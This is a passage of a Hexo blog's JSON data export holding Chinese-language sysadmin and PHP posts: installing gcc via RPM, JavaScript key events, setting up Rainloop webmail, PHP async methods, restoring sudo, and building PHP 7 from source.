cpp</pre><br>&nbsp;</p>\n<p>2. 下载rpm包，一个是 gcc，一个是cpp</p>\n<p><pre class=\"lang:sh decode:true \">wget <a href=\"ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm\" target=\"_blank\" rel=\"noopener\">ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm</a></pre></p>\n<p>wget <a href=\"ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm\" target=\"_blank\" rel=\"noopener\">ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm</a><br>&nbsp;</p>\n<p>3. 安装，先安装 cpp</p>\n<p><pre class=\"lang:sh decode:true \">rpm -ivh cpp-4.1.2-48.el5.x86_64.rpm</pre></p>\n<p>rpm -ivh gcc-4.1.2-48.el5.x86_64.rpm<br>&nbsp;</p>\n"},{"title":"javascript捕获ctrl+C等按键事件","id":"120","_content":"\n按键和鼠标事件对象里，都会附带当前**CTRL**,**SHIFT**等按键的状态．\n\n按键对应的属性列表\n\n*   **altKey  **ALT按键是否按着例如捕获ctrl+C复制事件\n参考文档: https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent","source":"_drafts/javascript捕获ctrl-C等按键事件.md","raw":"---\ntitle: javascript捕获ctrl+C等按键事件\nid: 120\ncategories:\n  - 未分类\ntags:\n---\n\n按键和鼠标事件对象里，都会附带当前**CTRL**,**SHIFT**等按键的状态．\n\n按键对应的属性列表\n\n*   **altKey  **ALT按键是否按着例如捕获ctrl+C复制事件\n参考文档: https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent","slug":"javascript捕获ctrl-C等按键事件","published":0,"date":"2018-03-05T11:32:58.727Z","updated":"2018-03-05T11:32:58.733Z","_id":"cjee5cikf00fngmlmfdcptdpm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>按键和鼠标事件对象里，都会附带当前<strong>CTRL</strong>,<strong>SHIFT</strong>等按键的状态．</p>\n<p>按键对应的属性列表</p>\n<ul>\n<li><strong>altKey  </strong>ALT按键是否按着例如捕获ctrl+C复制事件<br>参考文档: <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>按键和鼠标事件对象里，都会附带当前<strong>CTRL</strong>,<strong>SHIFT</strong>等按键的状态．</p>\n<p>按键对应的属性列表</p>\n<ul>\n<li><strong>altKey  </strong>ALT按键是否按着例如捕获ctrl+C复制事件<br>参考文档: <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent</a></li>\n</ul>\n"},{"title":"搭建自己的web邮件管理","id":"61","date":"2015-06-06T07:09:47.000Z","_content":"\n当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．\n\n### 项目地址\n\n##### 官网\n\n[http://www.rainloop.net/](http://www.rainloop.net/)\n\n##### github\n\n[https://github.com/RainLoop/rainloop-webmail](https://github.com/RainLoop/rainloop-webmail)\n\n##### 界面截屏\n\nhttp://www.rainloop.net/screenshots/\n\n### 特点介绍\n\n*   支持多语言，包括中文的完整支持\n*   基于PHP5.3+，满足大部分主机\n*   不需要数据库（使用联系人功能才需要数据库）\n*   内置多种主题，界面美观\n\n### 系统需求\n\n> **Web server: **[Apache](http://httpd.apache.org/), [nginx](http://nginx.org/), [lighttpd](http://www.lighttpd.net/), [MS IIS](http://www.iis.net/) or other with PHP support\r> \n> \n> **PHP:** 5.3 and above\r> \n> \n> **PHP extensions: **[cURL](http://php.net/manual/en/book.curl.php), [iconv](http://php.net/manual/en/book.iconv.php), [json](http://php.net/manual/en/book.json.php), [libxml](http://php.net/manual/en/book.libxml.php), [dom](http://php.net/manual/en/book.dom.php), [openssl](http://php.net/manual/en/book.openssl.php), [DateTime](http://php.net/manual/en/book.datetime.php), [PCRE](http://php.net/manual/en/book.pcre.php), [SPL](http://php.net/manual/en/book.spl.php)\r> \n> \n> **Browser: **[Internet Explorer 9+](http://windows.microsoft.com/en-US/internet-explorer/download-ie), [Firefox](http://www.mozilla-europe.org/), [Opera 10+](http://www.opera.com/), [Safari 3+](http://www.apple.com/safari/), [Google Chrome](http://www.google.com/chrome/)\r> \n> \n> **Optional: **[PDO](http://php.net/manual/en/book.pdo.php) ([MySQL](http://php.net/manual/en/ref.pdo-mysql.php)/[PostgreSQL](http://php.net/manual/en/ref.pdo-pgsql.php)/[SQLite](http://php.net/manual/en/ref.pdo-sqlite.php)) PHP extension (for contacts)\nPHP的扩展，除了openssl，curl安装时需要特别指定 `--with-openssl``--with-curl` ,其余扩展都是默认安装的．\n\n&nbsp;\n\n## 搭建\n\n##### 安装文档\n\nhttp://www.rainloop.net/docs/installation/\n\n##### 特别注意\n\n###### 创建数据目录\n\n需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问\n<pre>location ^~ /data {\n  deny all;\n}</pre>\n\n###### 安装后配置\n\n首先需要访问 http://mail.example.com/?admin 配置允许的域名\n\n初始登录 admin 密码 12345 ,登录后先改掉admin密码\n\n然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录\n\n###### 更换语言\n\n进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持\n\n###### 登录\n\n用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login\n\n这样就可以只输入邮箱@前的用户名","source":"_posts/e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84web-e9-82-ae-e4-bb-b6-e7-ae-a1-e7-90-86.md","raw":"---\ntitle: 搭建自己的web邮件管理\nid: 61\ncategories:\n  - linux\ndate: 2015-06-06 15:09:47\ntags:\n---\n\n当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．\n\n### 项目地址\n\n##### 官网\n\n[http://www.rainloop.net/](http://www.rainloop.net/)\n\n##### github\n\n[https://github.com/RainLoop/rainloop-webmail](https://github.com/RainLoop/rainloop-webmail)\n\n##### 界面截屏\n\nhttp://www.rainloop.net/screenshots/\n\n### 特点介绍\n\n*   支持多语言，包括中文的完整支持\n*   基于PHP5.3+，满足大部分主机\n*   不需要数据库（使用联系人功能才需要数据库）\n*   内置多种主题，界面美观\n\n### 系统需求\n\n> **Web server: **[Apache](http://httpd.apache.org/), [nginx](http://nginx.org/), [lighttpd](http://www.lighttpd.net/), [MS IIS](http://www.iis.net/) or other with PHP support\r> \n> \n> **PHP:** 5.3 and above\r> \n> \n> **PHP extensions: **[cURL](http://php.net/manual/en/book.curl.php), [iconv](http://php.net/manual/en/book.iconv.php), [json](http://php.net/manual/en/book.json.php), [libxml](http://php.net/manual/en/book.libxml.php), [dom](http://php.net/manual/en/book.dom.php), [openssl](http://php.net/manual/en/book.openssl.php), [DateTime](http://php.net/manual/en/book.datetime.php), [PCRE](http://php.net/manual/en/book.pcre.php), [SPL](http://php.net/manual/en/book.spl.php)\r> \n> \n> **Browser: **[Internet Explorer 9+](http://windows.microsoft.com/en-US/internet-explorer/download-ie), [Firefox](http://www.mozilla-europe.org/), [Opera 10+](http://www.opera.com/), [Safari 3+](http://www.apple.com/safari/), [Google Chrome](http://www.google.com/chrome/)\r> \n> \n> **Optional: **[PDO](http://php.net/manual/en/book.pdo.php) ([MySQL](http://php.net/manual/en/ref.pdo-mysql.php)/[PostgreSQL](http://php.net/manual/en/ref.pdo-pgsql.php)/[SQLite](http://php.net/manual/en/ref.pdo-sqlite.php)) PHP extension (for contacts)\nPHP的扩展，除了openssl，curl安装时需要特别指定 `--with-openssl``--with-curl` ,其余扩展都是默认安装的．\n\n&nbsp;\n\n## 搭建\n\n##### 安装文档\n\nhttp://www.rainloop.net/docs/installation/\n\n##### 特别注意\n\n###### 创建数据目录\n\n需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问\n<pre>location ^~ /data {\n  deny all;\n}</pre>\n\n###### 安装后配置\n\n首先需要访问 http://mail.example.com/?admin 配置允许的域名\n\n初始登录 admin 密码 12345 ,登录后先改掉admin密码\n\n然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录\n\n###### 更换语言\n\n进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持\n\n###### 登录\n\n用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login\n\n这样就可以只输入邮箱@前的用户名","slug":"e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84web-e9-82-ae-e4-bb-b6-e7-ae-a1-e7-90-86","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5ciki00fpgmlmy9w2dnhy","content":"<p>当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．</p>\n<h3 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h3><h5 id=\"官网\"><a href=\"#官网\" class=\"headerlink\" title=\"官网\"></a>官网</h5><p><a href=\"http://www.rainloop.net/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/</a></p>\n<h5 id=\"github\"><a href=\"#github\" class=\"headerlink\" title=\"github\"></a>github</h5><p><a href=\"https://github.com/RainLoop/rainloop-webmail\" target=\"_blank\" rel=\"noopener\">https://github.com/RainLoop/rainloop-webmail</a></p>\n<h5 id=\"界面截屏\"><a href=\"#界面截屏\" class=\"headerlink\" title=\"界面截屏\"></a>界面截屏</h5><p><a href=\"http://www.rainloop.net/screenshots/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/screenshots/</a></p>\n<h3 id=\"特点介绍\"><a href=\"#特点介绍\" class=\"headerlink\" title=\"特点介绍\"></a>特点介绍</h3><ul>\n<li>支持多语言，包括中文的完整支持</li>\n<li>基于PHP5.3+，满足大部分主机</li>\n<li>不需要数据库（使用联系人功能才需要数据库）</li>\n<li>内置多种主题，界面美观</li>\n</ul>\n<h3 id=\"系统需求\"><a href=\"#系统需求\" class=\"headerlink\" title=\"系统需求\"></a>系统需求</h3><blockquote>\n<p><strong>Web server: </strong><a href=\"http://httpd.apache.org/\" target=\"_blank\" rel=\"noopener\">Apache</a>, <a href=\"http://nginx.org/\" target=\"_blank\" rel=\"noopener\">nginx</a>, <a href=\"http://www.lighttpd.net/\" target=\"_blank\" rel=\"noopener\">lighttpd</a>, <a href=\"http://www.iis.net/\" target=\"_blank\" rel=\"noopener\">MS IIS</a> or other with PHP support</p>\n<p><strong>PHP:</strong> 5.3 and above</p>\n<p><strong>PHP extensions: </strong><a href=\"http://php.net/manual/en/book.curl.php\" target=\"_blank\" rel=\"noopener\">cURL</a>, <a href=\"http://php.net/manual/en/book.iconv.php\" target=\"_blank\" rel=\"noopener\">iconv</a>, <a href=\"http://php.net/manual/en/book.json.php\" target=\"_blank\" rel=\"noopener\">json</a>, <a href=\"http://php.net/manual/en/book.libxml.php\" target=\"_blank\" rel=\"noopener\">libxml</a>, <a href=\"http://php.net/manual/en/book.dom.php\" target=\"_blank\" rel=\"noopener\">dom</a>, <a href=\"http://php.net/manual/en/book.openssl.php\" target=\"_blank\" rel=\"noopener\">openssl</a>, <a href=\"http://php.net/manual/en/book.datetime.php\" target=\"_blank\" rel=\"noopener\">DateTime</a>, <a href=\"http://php.net/manual/en/book.pcre.php\" target=\"_blank\" rel=\"noopener\">PCRE</a>, <a href=\"http://php.net/manual/en/book.spl.php\" target=\"_blank\" rel=\"noopener\">SPL</a></p>\n<p><strong>Browser: </strong><a href=\"http://windows.microsoft.com/en-US/internet-explorer/download-ie\" target=\"_blank\" rel=\"noopener\">Internet Explorer 9+</a>, <a href=\"http://www.mozilla-europe.org/\" target=\"_blank\" rel=\"noopener\">Firefox</a>, <a href=\"http://www.opera.com/\" target=\"_blank\" rel=\"noopener\">Opera 10+</a>, <a href=\"http://www.apple.com/safari/\" target=\"_blank\" rel=\"noopener\">Safari 3+</a>, <a href=\"http://www.google.com/chrome/\" target=\"_blank\" rel=\"noopener\">Google Chrome</a></p>\n<p><strong>Optional: </strong><a href=\"http://php.net/manual/en/book.pdo.php\" target=\"_blank\" rel=\"noopener\">PDO</a> (<a href=\"http://php.net/manual/en/ref.pdo-mysql.php\" target=\"_blank\" rel=\"noopener\">MySQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-pgsql.php\" target=\"_blank\" rel=\"noopener\">PostgreSQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-sqlite.php\" target=\"_blank\" rel=\"noopener\">SQLite</a>) PHP extension (for contacts)<br>PHP的扩展，除了openssl，curl安装时需要特别指定 <code>--with-openssl`</code>–with-curl` ,其余扩展都是默认安装的．</p>\n</blockquote>\n<p>&nbsp;</p>\n<h2 id=\"搭建\"><a href=\"#搭建\" class=\"headerlink\" title=\"搭建\"></a>搭建</h2><h5 id=\"安装文档\"><a href=\"#安装文档\" class=\"headerlink\" title=\"安装文档\"></a>安装文档</h5><p><a href=\"http://www.rainloop.net/docs/installation/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/docs/installation/</a></p>\n<h5 id=\"特别注意\"><a href=\"#特别注意\" class=\"headerlink\" title=\"特别注意\"></a>特别注意</h5><h6 id=\"创建数据目录\"><a href=\"#创建数据目录\" class=\"headerlink\" title=\"创建数据目录\"></a>创建数据目录</h6><p>需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问</p>\n<pre>location ^~ /data {\n  deny all;\n}</pre>\n\n<h6 id=\"安装后配置\"><a href=\"#安装后配置\" class=\"headerlink\" title=\"安装后配置\"></a>安装后配置</h6><p>首先需要访问 <a href=\"http://mail.example.com/?admin\" target=\"_blank\" rel=\"noopener\">http://mail.example.com/?admin</a> 配置允许的域名</p>\n<p>初始登录 admin 密码 12345 ,登录后先改掉admin密码</p>\n<p>然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录</p>\n<h6 id=\"更换语言\"><a href=\"#更换语言\" class=\"headerlink\" title=\"更换语言\"></a>更换语言</h6><p>进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持</p>\n<h6 id=\"登录\"><a href=\"#登录\" class=\"headerlink\" title=\"登录\"></a>登录</h6><p>用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login</p>\n<p>这样就可以只输入邮箱@前的用户名</p>\n","site":{"data":{}},"excerpt":"","more":"<p>当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．</p>\n<h3 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h3><h5 id=\"官网\"><a href=\"#官网\" class=\"headerlink\" title=\"官网\"></a>官网</h5><p><a href=\"http://www.rainloop.net/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/</a></p>\n<h5 id=\"github\"><a href=\"#github\" class=\"headerlink\" title=\"github\"></a>github</h5><p><a href=\"https://github.com/RainLoop/rainloop-webmail\" target=\"_blank\" rel=\"noopener\">https://github.com/RainLoop/rainloop-webmail</a></p>\n<h5 id=\"界面截屏\"><a href=\"#界面截屏\" class=\"headerlink\" title=\"界面截屏\"></a>界面截屏</h5><p><a href=\"http://www.rainloop.net/screenshots/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/screenshots/</a></p>\n<h3 id=\"特点介绍\"><a href=\"#特点介绍\" class=\"headerlink\" title=\"特点介绍\"></a>特点介绍</h3><ul>\n<li>支持多语言，包括中文的完整支持</li>\n<li>基于PHP5.3+，满足大部分主机</li>\n<li>不需要数据库（使用联系人功能才需要数据库）</li>\n<li>内置多种主题，界面美观</li>\n</ul>\n<h3 id=\"系统需求\"><a href=\"#系统需求\" class=\"headerlink\" title=\"系统需求\"></a>系统需求</h3><blockquote>\n<p><strong>Web server: </strong><a href=\"http://httpd.apache.org/\" target=\"_blank\" rel=\"noopener\">Apache</a>, <a href=\"http://nginx.org/\" target=\"_blank\" rel=\"noopener\">nginx</a>, <a href=\"http://www.lighttpd.net/\" target=\"_blank\" rel=\"noopener\">lighttpd</a>, <a href=\"http://www.iis.net/\" target=\"_blank\" rel=\"noopener\">MS IIS</a> or other with PHP support</p>\n<p><strong>PHP:</strong> 5.3 and above</p>\n<p><strong>PHP extensions: </strong><a href=\"http://php.net/manual/en/book.curl.php\" target=\"_blank\" rel=\"noopener\">cURL</a>, <a href=\"http://php.net/manual/en/book.iconv.php\" target=\"_blank\" rel=\"noopener\">iconv</a>, <a href=\"http://php.net/manual/en/book.json.php\" target=\"_blank\" rel=\"noopener\">json</a>, <a href=\"http://php.net/manual/en/book.libxml.php\" target=\"_blank\" rel=\"noopener\">libxml</a>, <a href=\"http://php.net/manual/en/book.dom.php\" target=\"_blank\" rel=\"noopener\">dom</a>, <a href=\"http://php.net/manual/en/book.openssl.php\" target=\"_blank\" rel=\"noopener\">openssl</a>, <a href=\"http://php.net/manual/en/book.datetime.php\" target=\"_blank\" rel=\"noopener\">DateTime</a>, <a href=\"http://php.net/manual/en/book.pcre.php\" target=\"_blank\" rel=\"noopener\">PCRE</a>, <a href=\"http://php.net/manual/en/book.spl.php\" target=\"_blank\" rel=\"noopener\">SPL</a></p>\n<p><strong>Browser: </strong><a href=\"http://windows.microsoft.com/en-US/internet-explorer/download-ie\" target=\"_blank\" rel=\"noopener\">Internet Explorer 9+</a>, <a href=\"http://www.mozilla-europe.org/\" target=\"_blank\" rel=\"noopener\">Firefox</a>, <a href=\"http://www.opera.com/\" target=\"_blank\" rel=\"noopener\">Opera 10+</a>, <a href=\"http://www.apple.com/safari/\" target=\"_blank\" rel=\"noopener\">Safari 3+</a>, <a href=\"http://www.google.com/chrome/\" target=\"_blank\" rel=\"noopener\">Google Chrome</a></p>\n<p><strong>Optional: </strong><a href=\"http://php.net/manual/en/book.pdo.php\" target=\"_blank\" rel=\"noopener\">PDO</a> (<a href=\"http://php.net/manual/en/ref.pdo-mysql.php\" target=\"_blank\" rel=\"noopener\">MySQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-pgsql.php\" target=\"_blank\" rel=\"noopener\">PostgreSQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-sqlite.php\" target=\"_blank\" rel=\"noopener\">SQLite</a>) PHP extension (for contacts)<br>PHP的扩展，除了openssl，curl安装时需要特别指定 <code>--with-openssl`</code>–with-curl` ,其余扩展都是默认安装的．</p>\n</blockquote>\n<p>&nbsp;</p>\n<h2 id=\"搭建\"><a href=\"#搭建\" class=\"headerlink\" title=\"搭建\"></a>搭建</h2><h5 id=\"安装文档\"><a href=\"#安装文档\" class=\"headerlink\" title=\"安装文档\"></a>安装文档</h5><p><a href=\"http://www.rainloop.net/docs/installation/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/docs/installation/</a></p>\n<h5 id=\"特别注意\"><a href=\"#特别注意\" class=\"headerlink\" title=\"特别注意\"></a>特别注意</h5><h6 id=\"创建数据目录\"><a href=\"#创建数据目录\" class=\"headerlink\" title=\"创建数据目录\"></a>创建数据目录</h6><p>需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问</p>\n<pre>location ^~ /data {\n  deny all;\n}</pre>\n\n<h6 id=\"安装后配置\"><a href=\"#安装后配置\" class=\"headerlink\" title=\"安装后配置\"></a>安装后配置</h6><p>首先需要访问 <a href=\"http://mail.example.com/?admin\" target=\"_blank\" rel=\"noopener\">http://mail.example.com/?admin</a> 配置允许的域名</p>\n<p>初始登录 admin 密码 12345 ,登录后先改掉admin密码</p>\n<p>然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录</p>\n<h6 id=\"更换语言\"><a href=\"#更换语言\" class=\"headerlink\" title=\"更换语言\"></a>更换语言</h6><p>进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持</p>\n<h6 id=\"登录\"><a href=\"#登录\" class=\"headerlink\" title=\"登录\"></a>登录</h6><p>用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login</p>\n<p>这样就可以只输入邮箱@前的用户名</p>\n"},{"title":"PHP异步执行方案的总结","id":"65","date":"2015-06-06T10:48:58.000Z","_content":"\n比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：\n\n### fsockopen等\n\n打开另一个专门发送邮件的网页，不去管响应结果．\n\n不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说\n\n### exec('nohup ... &amp;') 等\n\n借助nohup多进程命令，在新进程里打开另一个本地可执行文件．\n\n这样需要派生两个进程，效率不高．\n\n### pcntl多进程扩展\n\n和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．\n\n### pthreads多线程扩展\n\n这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行","source":"_posts/php-e5-bc-82-e6-ad-a5-e6-89-a7-e8-a1-8c-e6-96-b9-e6-a1-88-e7-9a-84-e6-80-bb-e7-bb-93.md","raw":"---\ntitle: PHP异步执行方案的总结\nid: 65\ncategories:\n  - php\ndate: 2015-06-06 18:48:58\ntags:\n---\n\n比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：\n\n### fsockopen等\n\n打开另一个专门发送邮件的网页，不去管响应结果．\n\n不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说\n\n### exec('nohup ... &amp;') 等\n\n借助nohup多进程命令，在新进程里打开另一个本地可执行文件．\n\n这样需要派生两个进程，效率不高．\n\n### pcntl多进程扩展\n\n和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．\n\n### pthreads多线程扩展\n\n这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行","slug":"php-e5-bc-82-e6-ad-a5-e6-89-a7-e8-a1-8c-e6-96-b9-e6-a1-88-e7-9a-84-e6-80-bb-e7-bb-93","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cikj00frgmlmrol4xdxg","content":"<p>比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：</p>\n<h3 id=\"fsockopen等\"><a href=\"#fsockopen等\" class=\"headerlink\" title=\"fsockopen等\"></a>fsockopen等</h3><p>打开另一个专门发送邮件的网页，不去管响应结果．</p>\n<p>不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说</p>\n<h3 id=\"exec-‘nohup-…-amp-’-等\"><a href=\"#exec-‘nohup-…-amp-’-等\" class=\"headerlink\" title=\"exec(‘nohup … &amp;’) 等\"></a>exec(‘nohup … &amp;’) 等</h3><p>借助nohup多进程命令，在新进程里打开另一个本地可执行文件．</p>\n<p>这样需要派生两个进程，效率不高．</p>\n<h3 id=\"pcntl多进程扩展\"><a href=\"#pcntl多进程扩展\" class=\"headerlink\" title=\"pcntl多进程扩展\"></a>pcntl多进程扩展</h3><p>和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．</p>\n<h3 id=\"pthreads多线程扩展\"><a href=\"#pthreads多线程扩展\" class=\"headerlink\" title=\"pthreads多线程扩展\"></a>pthreads多线程扩展</h3><p>这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行</p>\n","site":{"data":{}},"excerpt":"","more":"<p>比如有时候需要发送个邮件，又不想阻塞页面时间太长，这个时候就需要以下的一些异步方法：</p>\n<h3 id=\"fsockopen等\"><a href=\"#fsockopen等\" class=\"headerlink\" title=\"fsockopen等\"></a>fsockopen等</h3><p>打开另一个专门发送邮件的网页，不去管响应结果．</p>\n<p>不过建立HTTP连接，发送请求的时间仍然会阻塞，内网页面还好说</p>\n<h3 id=\"exec-‘nohup-…-amp-’-等\"><a href=\"#exec-‘nohup-…-amp-’-等\" class=\"headerlink\" title=\"exec(‘nohup … &amp;’) 等\"></a>exec(‘nohup … &amp;’) 等</h3><p>借助nohup多进程命令，在新进程里打开另一个本地可执行文件．</p>\n<p>这样需要派生两个进程，效率不高．</p>\n<h3 id=\"pcntl多进程扩展\"><a href=\"#pcntl多进程扩展\" class=\"headerlink\" title=\"pcntl多进程扩展\"></a>pcntl多进程扩展</h3><p>和上面差不多，好的一点在于只需要派生一个进程，而且发送邮件的代码可以写在一起，不用新创建一个文件．</p>\n<h3 id=\"pthreads多线程扩展\"><a href=\"#pthreads多线程扩展\" class=\"headerlink\" title=\"pthreads多线程扩展\"></a>pthreads多线程扩展</h3><p>这个是最好的选择，既不用耗费派生进程时的系统资源，又方便控制．可以应付更复杂的情况，比如交叉执行</p>\n"},{"title":"恢复sudo命令","id":"153","_content":"\nFedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。\n\n好在su命令还在：\n<pre>[xiaoai@xiaoai snippets]$ su -\n密码：\n[root@xiaoai ~]# yum install sudo</pre>\n下次用yum remove得小心了","source":"_drafts/恢复sudo命令.md","raw":"---\ntitle: 恢复sudo命令\nid: 153\ncategories:\n  - linux\ntags:\n---\n\nFedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。\n\n好在su命令还在：\n<pre>[xiaoai@xiaoai snippets]$ su -\n密码：\n[root@xiaoai ~]# yum install sudo</pre>\n下次用yum remove得小心了","slug":"恢复sudo命令","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","_id":"cjee5cikl00ftgmlm670p3rru","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Fedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。</p>\n<p>好在su命令还在：</p>\n<p><pre>[xiaoai@xiaoai snippets]$ su -<br>密码：<br>[root@xiaoai ~]# yum install sudo</pre><br>下次用yum remove得小心了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Fedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。</p>\n<p>好在su命令还在：</p>\n<p><pre>[xiaoai@xiaoai snippets]$ su -<br>密码：<br>[root@xiaoai ~]# yum install sudo</pre><br>下次用yum remove得小心了</p>\n"},{"title":"支付宝集成的那些坑","id":"256","_content":"","source":"_drafts/支付宝集成的那些坑.md","raw":"---\ntitle: 支付宝集成的那些坑\nid: 256\ncategories:\n  - 未分类\ntags:\n---\n","slug":"支付宝集成的那些坑","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","_id":"cjee5cikn00fvgmlmug5prk51","comments":1,"layout":"post","photos":[],"link":"","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"PHP发送POST请求的方法整理","id":"258","_content":"","source":"_drafts/PHP发送POST请求的方法整理.md","raw":"---\ntitle: PHP发送POST请求的方法整理\nid: 258\ncategories:\n  - 未分类\ntags:\n---\n","slug":"PHP发送POST请求的方法整理","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","_id":"cjee5ciko00fxgmlmu7hi66am","comments":1,"layout":"post","photos":[],"link":"","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"尝鲜PHP 7","id":"45","date":"2015-05-14T22:27:06.000Z","_content":"\nphp7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．\n\n文档可以在 [https://wiki.php.net/phpng](https://wiki.php.net/phpng) 看到\n\n## 安装\n\n普通用户需要从https协议下载，ssh协议只面向PHP小组开发者\n<pre class=\"code\">git clone https://git.php.net/repository/php-src.git</pre>\n<pre class=\"code\">./buildconf\n./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config\n</pre>\n\n#### 在安装时可能遇到的依赖问题\n\n<pre>checking for re2c... no\nconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.\n</pre>\n\n##### 需要安装[re2c库](http://re2c.org/)\n\n<pre>wget 